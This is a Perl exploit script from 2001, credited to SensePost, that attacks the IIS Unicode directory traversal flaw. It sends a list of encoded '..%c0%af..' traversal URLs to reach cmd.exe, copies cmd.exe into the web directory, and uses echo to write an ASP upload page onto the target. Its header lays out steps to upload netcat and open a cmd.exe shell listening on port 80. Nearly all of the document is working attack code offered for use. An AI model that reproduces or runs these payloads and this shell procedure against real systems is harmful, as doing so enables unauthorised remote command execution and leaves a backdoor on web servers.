#!/usr/bin/perl 
#######################
# Unicode upload creator
# 
# Works like this - two files (upload.asp and upload.inc - have 
# in the same dir as the PERL script) are build in the webroot 
# (or anywhere else) using echo and some conversion strings.
# These files allows you to upload any file by 
# simply surfing with a browser to the server.
# 
# Typical use: (5 easy steps to a shell)
# 1. Find the webroot (duh)- let say its f:\the web pages\theroot
# 2. perl unicodeloader target:80 'f:\the web pages\theroot'
# 3. surf to target/upload.asp and upload nc.exe
# 4. perl unicodexecute3.pl target:80 'f:\the web pages\theroot\nc -l -p 80 -e cmd.exe'
# 5. telnet target 80
# 
# Above procedure will drop you into a shell on the box
# without crashing the server (*winks at Eeye*).
# Of coure you might want to upload other goodies as well
# right after nc.exe - fscan.exe seems a good choice :)
# This procedure is nice for servers that are very tightly 
# firewalled; no FTP, RCP or TFTP out of it - as everything
# is client---> server on port 80.
#
# kids, please have a *good* look at the code before you use it :-]
# more info at http://www.securityfocus.com/vdb/bottom.html?section=exploit&vid=1806
#
# 2001/01/24 Roelof Temmingh 
# roelof@sensepost.com
# http://www.sensepost.com
#
# PS: if the script breaks during the building of the uploader page
#     you should delete both upload.asp and upload.inc manually
######################################################################################

use Socket;

my $runi; my $thedir; $|=1;
open (ASP,"upload.asp") || die "Couldnt open the upload.asp file\n";
open (INC,"upload.inc") || die "Couldnt open the upload.inc file\n";
# --------------init
if ($#ARGV<1) {die "Usage: unicodeloader IP:port webroot\n";}
my ($host,$port)=split(/:/,@ARGV[0]);
my $target = inet_aton($host);
my $location=@ARGV[1];
print "\nCreating uploading webpage on $host on port $port.\nThe webroot is $location.\n\n";
# -------------find the correct string
my @unis=(
"/scripts/..%c0%af../winnt/system32/cmd.exe?/c",
"/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c",
"/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c");
my $uni;my $execdir; my $dummy; my $line;
foreach $uni (@unis){
 print "testing directory $uni\n";
 my @results=sendraw("GET $uni+dir HTTP/1.0\r\n\r\n");
 foreach $line (@results){
  if ($line =~ /Directory/) {
  ($dummy,$execdir)=split(/Directory of /,$line);   
   $execdir =~ s/\r//g;
   $execdir =~ s/\n//g;
   if ($execdir =~ / /) {$thedir="%22".$execdir;}
    else {$thedir=$execdir;}
   $thedir=~ s/ /%20/g;
   print "farmer brown directory: $thedir\n";
   $runi=$uni; goto further;}
 }
}
die "nope...sorry..not vulnerable\n";

further:
#---------------test if upload exists already
my $a=`which ifconfig`; chomp $a; 
my $aa=`$a -au | grep -i mask | grep -v 127.0.0.1 | head -n 1`; $aa=~s/ //g;
sendraw("GET /naughty_real_$aa\r\n\r\n");
my $command; my $line;
if ($location =~ / /) {$command="dir %22".$location."%22";}
 else {$command="dir ".$location;}
$command=~s/ /+/g;
my @results=sendraw("GET $runi+$command\r\n\r\n");
foreach $line (@results){
 if ($line =~ /upload.asp/) {die "uploader is there already..\n";}
}
# --------------test if cmd has been copied:
my $failed=1;
my $command="dir $thedir%22";
$command=~s/ /+/g;
my @results=sendraw("GET $runi+$command HTTP/1.0\r\n\r\n");
my $line;
foreach $line (@results){
 if ($line =~ /denied/) {die "cant do a dir in the directory - try switching dirs order around\n";}
 if ($line =~ /sensepost.exe/) {print "sensepost.exe found on system\n"; $failed=0;}
}
#--------------we should copy it if its not there
my $failed2=1;
if ($failed==1) { 
 print "sensepost.exe not found - lets copy it quick\n";
 $command="copy c:\\winnt\\system32\\cmd.exe $thedir\\sensepost.exe%22";
 $command=~s/ /+/g;
 my @results2=sendraw("GET $runi+$command HTTP/1.0\r\n\r\n");
 my $line2;
 foreach $line2 (@results2){
  if (($line2 =~ /copied/ )) {$failed2=0;}
  if (($line2 =~ /denied/ )) {die "access denied to copy here - try switching dirs order around\n";}
 }
 if ($failed2==1) {die "copy of CMD failed - inspect manually:\n@results2\n\n"};
} 
# ------------ we can assume that the cmd.exe is copied from here..
my $path;
($dummy,$path)=split(/:/,$thedir);
$path =~ s/\\/\//g;
my @unidirs=split(/\//,$runi);
my $unidir=@unidirs[1];
$runi="/".$unidir."/sensepost.exe?/c";
print "uploading ASP section:\n";
while (<ASP>) {
 chomp;
 s/([<^&>])/^$1/g; s/\%/%25/g; s/\>/%3e/g;
 s/\</%3c/g; s/([\x0D\x0A])//g; s/\=/%3d/g;
 s/\&/%26/g; s/\+/%2b/g;
 if ($location =~ / /) {$command="echo $_ >> %22".$location."\\upload.asp%22";}
  else {$command="echo $_ >> $location\\upload.asp";}
  $command=~s/ /%20/g;
  @results=sendraw("GET $runi+$command HTTP/1.0\r\n\r\n");
  print ".";
  foreach $line (@results){
   if ($line =~ /denied/) {die "sorry, access denied to write the upload page\n";}
  }
}
close (ASP);
###its really just the same as the previous one
print "\nuploading the INC section: (this may take a while)\n";
while (<INC>) {
 chomp;
 s/([<^&>])/^$1/g; s/\%/%25/g; s/\>/%3e/g;
 s/\</%3c/g; s/([\x0D\x0A])//g; s/\=/%3d/g;
 s/\&/%26/g;  s/\+/%2b/g;
 if ($location =~ / /) {$command="echo $_ >> %22".$location."\\upload.inc%22";}
  else {$command="echo $_ >> $location\\upload.inc";}
 $command=~s/ /%20/g;
 my @results=sendraw("GET $runi+$command HTTP/1.0\r\n\r\n");
 print ".";
}
close (INC);
print "\nupload page created. \n\nNow simply surf to $host/upload.asp and enjoy.\n";
print "Files will be uploaded to $location\n";

# -------------slighty modified RFP sendraw
sub sendraw { 
 my ($pstr)=@_;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket problems\n");
 if(connect(S,pack "SnA4x8",2,$port,$target)){
  my @in="";
  select(S); $|=1; print $pstr;
  while(<S>) { 
   push @in,$_; last if ($line=~ /^[\r\n]+$/ );}
  select(STDOUT); return @in;
 } else { die("connect problems\n"); }
}
# Spidermark: sensepostdata unicodeloader





